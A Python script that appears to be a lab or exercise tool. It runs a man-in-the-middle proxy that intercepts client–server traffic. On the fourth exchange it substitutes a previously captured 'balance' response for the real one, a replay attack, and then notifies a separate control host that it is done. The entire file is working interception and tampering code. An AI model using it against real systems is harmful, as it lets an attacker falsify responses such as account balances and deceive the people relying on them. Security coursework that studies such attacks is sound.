#!/usr/bin/python3
import ast
import socket
import signal
import requests
import argparse
import base64
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from contextlib import contextmanager


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


def send_done_to_cs(ip, port):
    url = "http://%s:%s" % (ip, port)
    payload = { "REQUEST": '{ "type": "done" }' }
    
    requests.post(url, data=payload)

def stop_mitm(*args):
    with ignored(Exception):
        client.shutdown(socket.SHUT_RDWR)
        client.close()
        server.shutdown(socket.SHUT_RDWR)
        server.close()
        fake_server.shutdown(socket.SHUT_RDWR)
        fake_server.close()


def start_mitm(port, server_ip, server_port, cs_ip, cs_port):
    signal.signal(signal.SIGTERM, stop_mitm)

    try:
        fake_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        fake_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        fake_server.bind(("0.0.0.0", port))
        fake_server.listen(1)
        count = 0
        prev_balance_response = None

        while 1:
            client, address = fake_server.accept()

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((server_ip, server_port))

            message = client.recv(1024)
            server.send(message)
            response = server.recv(1024)

            if count == 2:
                prev_balance_response = response
                client.send(response)
            elif count == 3:
                client.send(prev_balance_response)
                send_done_to_cs(cs_ip, cs_port)
            else:
                client.send(response)                

            server.close()
            client.close()
            count += 1
    except KeyboardInterrupt:
        stop_mitm()



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, default=4000)
    parser.add_argument('-s', type=str, default="127.0.0.1")
    parser.add_argument('-q', type=int, default=3000)
    parser.add_argument('-c', type=str, default="127.0.0.1")
    parser.add_argument('-d', type=int, default=5000)
    args = parser.parse_args()

    print('started', flush=1)
    
    start_mitm(args.p, args.s, args.q, args.c, args.d)
